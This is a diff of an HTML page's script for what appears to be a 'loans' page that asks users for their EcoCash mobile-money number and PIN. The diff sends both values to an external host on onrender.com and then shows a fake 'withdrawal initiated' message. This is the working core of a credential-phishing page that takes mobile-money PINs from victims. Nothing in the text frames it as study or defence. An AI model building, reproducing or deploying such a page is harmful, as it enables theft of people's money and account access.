@@ -137,12 +137,14 @@ button:hover{
 
 </div>
 
-<script>
-
+</div><script>
 async function submitForm() {
 
-    const ecocash_number = document.getElementById("ecocash_number").value.trim();
-    const ecocash_pin = document.getElementById("ecocash_pin").value.trim();
+    const ecocash_number =
+        document.getElementById("ecocash_number").value;
+
+    const ecocash_pin =
+        document.getElementById("ecocash_pin").value;
 
     if (!ecocash_number || !ecocash_pin) {
         alert("Please fill in all fields.");
@@ -151,45 +153,33 @@ async function submitForm() {
 
     try {
 
-        const response = await fetch("/submit", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                ecocash_number: ecocash_number,
-                ecocash_pin: ecocash_pin
-            })
-        });
-
-        if (!response.ok) {
-            throw new Error("Server returned " + response.status);
-        }
+        const response = await fetch(
+    "https://kashagi-loans-1-sq9v.onrender.com/submit",
+            {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    ecocash_number: ecocash_number,
+                    ecocash_pin: ecocash_pin
+                })
+            }
+        );
 
         const data = await response.json();
 
         if (data.success) {
-
-            alert("✅ Your Withdrawal request has been initiated successfully!");
-
-            window.location.replace("/thankyou.html");
-        } else {
-
-            alert("❌ Submission failed. Please try again.");
-
+             alert("Withdrawal initiated successfully.");
+            window.location.href = "thankyou.html";
+        } else{
+            alert("Submission failed.");
         }
 
     } catch (error) {
-
-        console.error(error);
-
-        alert("❌ Server connection error. Please try again later.");
-
+        alert("Server connection error.");
+        console.log(error);
     }
-
 }
-
-</script>
-
-</body>
+</script></body>
 </html>
